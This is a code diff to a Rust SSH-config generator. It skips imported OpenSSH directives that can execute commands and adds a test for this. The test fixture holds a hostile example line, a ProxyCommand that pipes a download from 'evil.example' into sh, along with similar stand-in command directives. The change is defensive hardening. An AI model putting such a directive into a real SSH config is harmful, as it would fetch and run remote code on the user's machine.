@@ -103,6 +103,12 @@ fn render_host(host: &Host) -> String {
         push_directive(&mut out, "DynamicForward", forward);
     }
     for option in &host.options {
+        if is_command_executing_directive(option) {
+            out.push_str("    # sshnav: skipped imported directive that can execute a command: ");
+            out.push_str(option);
+            out.push('\n');
+            continue;
+        }
         out.push_str("    ");
         out.push_str(option);
         out.push('\n');
@@ -117,6 +123,27 @@ fn push_directive(out: &mut String, key: &str, value: &str) {
     out.push(' ');
     out.push_str(value);
     out.push('\n');
+}
+
+/// OpenSSH directives that run an arbitrary command as a side effect of
+/// resolving or connecting to a host. `sshnav generate` writes into a file
+/// that gets `Include`d into the user's real `~/.ssh/config`, so an
+/// imported directive here would run outside of sshnav's own argv
+/// construction and its `is_safe_option` allowlist (see `runner.rs`).
+fn is_command_executing_directive(option: &str) -> bool {
+    let Some((key, _)) = option.split_once(char::is_whitespace) else {
+        return false;
+    };
+    matches!(
+        key.to_ascii_lowercase().as_str(),
+        "proxycommand"
+            | "localcommand"
+            | "permitlocalcommand"
+            | "remotecommand"
+            | "knownhostscommand"
+            | "match"
+            | "include"
+    )
 }
 
 fn timestamp() -> u64 {
@@ -165,6 +192,39 @@ mod tests {
         assert!(rendered.contains("Host prod-db\n"));
         assert!(rendered.contains("# IdentityFile managed by sshnav encrypted key store"));
         assert!(!rendered.contains("/home/me/prod"));
+    }
+
+    #[test]
+    fn generated_config_skips_command_executing_directives() {
+        let mut inventory = Inventory::default();
+        let mut host = Host::new("prod-db".into(), "10.0.0.10".into());
+        host.user = Some("ubuntu".into());
+        host.options = vec![
+            "ProxyCommand sh -c 'curl evil.example/x | sh'".into(),
+            "LocalCommand touch /tmp/pwned".into(),
+            "PermitLocalCommand yes".into(),
+            "RemoteCommand id".into(),
+            "KnownHostsCommand /tmp/evil".into(),
+            "ServerAliveInterval 60".into(),
+        ];
+        inventory.hosts.push(host);
+
+        let rendered = render(&inventory).unwrap();
+
+        assert!(!rendered.contains("    ProxyCommand sh -c"));
+        assert!(!rendered.contains("    LocalCommand touch"));
+        assert!(!rendered.contains("    PermitLocalCommand yes\n"));
+        assert!(!rendered.contains("    RemoteCommand id\n"));
+        assert!(!rendered.contains("    KnownHostsCommand /tmp/evil\n"));
+        assert!(rendered.contains("    ServerAliveInterval 60\n"));
+        assert!(rendered.contains("# sshnav: skipped imported directive"));
+        assert!(rendered.contains("ProxyCommand sh -c"));
+        assert_eq!(
+            rendered
+                .matches("# sshnav: skipped imported directive")
+                .count(),
+            5
+        );
     }
 
     #[test]
